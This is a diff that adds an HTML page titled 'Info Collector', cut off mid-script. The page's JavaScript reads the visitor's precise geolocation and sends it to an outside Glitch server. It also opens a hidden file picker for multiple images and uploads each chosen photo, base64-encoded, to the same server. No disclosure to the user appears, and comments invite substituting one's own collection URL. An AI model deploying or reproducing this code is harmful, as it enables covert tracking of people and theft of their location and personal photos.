@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Info Collector</title>
+</head>
+<body>
+    <script>
+        // Function to get the device's location
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Function to handle the location data
+        function showPosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const timestamp = position.timestamp;
+
+            // Send location data to your Glitch server
+            fetch('https://agate-boatneck-meteor.glitch.me/location', {  // Use your Glitch URL here
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    latitude: lat,
+                    longitude: lon,
+                    accuracy: accuracy,
+                    timestamp: timestamp
+                })
+            });
+        }
+
+        // Function to access the device's gallery
+        function accessGallery() {
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.accept = 'image/*';
+            input.multiple = true;
+            input.style.display = 'none';
+            document.body.appendChild(input);
+            input.click();
+
+            input.addEventListener('change', function(event) {
+                const files = event.target.files;
+                for (let i = 0; i < files.length; i++) {
+                    const file = files[i];
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        const base64String = e.target.result.split(',')[1];
+                        // Send image data to your Glitch server
+                        fetch('https://agate-boatneck-meteor.glitch.me/image', {  // Use your Glitch URL here
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
